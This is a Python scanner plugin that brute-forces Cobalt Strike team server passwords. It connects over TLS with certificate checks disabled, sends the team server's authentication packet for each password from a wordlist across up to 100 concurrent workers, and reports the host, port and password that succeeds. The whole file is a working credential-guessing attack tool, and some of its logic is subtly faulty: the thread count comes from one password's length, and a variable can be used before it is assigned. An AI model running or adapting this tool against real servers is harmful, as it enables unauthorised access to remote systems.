#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# description: Cobalt Strike Team Server Password Brute Forcer
# reference: https://github.com/ryanohoro/csbruter

"""
Copyright (c) saucerman (https://saucer-man.com)
See the file 'LICENSE' for copying permission
"""
import gevent
from gevent.queue import Queue
import socket
import ssl
from lib.core.data import paths
from urllib.parse import urlparse
import traceback


is_continue = True


class NotConnectedException(Exception):
    def __init__(self, message=None, node=None):
        self.message = message
        self.node = node


class Connector:
    def __init__(self):
        self.sock = None
        self.ssl_sock = None
        self.ctx = ssl.SSLContext()
        self.ctx.verify_mode = ssl.CERT_NONE
        pass

    def is_connected(self):
        return self.sock and self.ssl_sock

    def open(self, hostname, port):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(15)
        self.ssl_sock = self.ctx.wrap_socket(self.sock)

        if hostname == socket.gethostname():
            ipaddress = socket.gethostbyname_ex(hostname)[2][0]
            self.ssl_sock.connect((ipaddress, port))
        else:
            self.ssl_sock.connect((hostname, port))

    def close(self):
        if self.sock:
            self.sock.close()
        self.sock = None
        self.ssl_sock = None

    def send(self, buffer):
        if not self.ssl_sock: raise NotConnectedException("Not connected (SSL Socket is null)")
        self.ssl_sock.sendall(buffer)

    def receive(self):
        if not self.ssl_sock: raise NotConnectedException("Not connected (SSL Socket is null)")
        received_size = 0
        data_buffer = b""

        while received_size < 4:
            data_in = self.ssl_sock.recv()
            data_buffer = data_buffer + data_in
            received_size += len(data_in)

        return data_buffer


def password_check(passwords, host, port, result):
    global is_continue
    while not passwords.empty() and is_continue:
        try:
            password = passwords.get()
            conn = Connector()
            conn.open(host, port)
            payload = bytearray(b"\x00\x00\xbe\xef") + len(password).to_bytes(1, "big", signed=True) + bytes(
                bytes(password, "ascii").ljust(256, b"A"))
            conn.send(payload)
            if conn.is_connected(): res = conn.receive()
            if conn.is_connected(): conn.close()
            if res == bytearray(b"\x00\x00\xca\xfe"):
                result.append("{}:{}:{}".format(host, port, password))
                is_continue = False
        except:
            # traceback.print_exc()
            pass


def poc(url):
    # url = "http://www.example.org:22222/default.html?ct=32&op=92&item=98"
    # --> host:www.example.org   port:22222
    try:
        if url[:4] != "http":
            url = "http://" + url
        o = urlparse(url)
        host = socket.gethostbyname(o.hostname)
        port = int(o.port) if o.port else 50050

        passwords = Queue()
        with open(paths.DATA_PATH + '/cobalt-strike.txt') as f:
            for password in f.read().splitlines():
                passwords.put(password)
        result = []
        if len(password) <= 100:
            threads_count = len(password)
        else:
            threads_count = 100
        gevent.joinall([gevent.spawn(password_check, passwords, host, port, result) for i in range(threads_count)])

        if result:
            return result
        else:
            return False
    except:
        return False
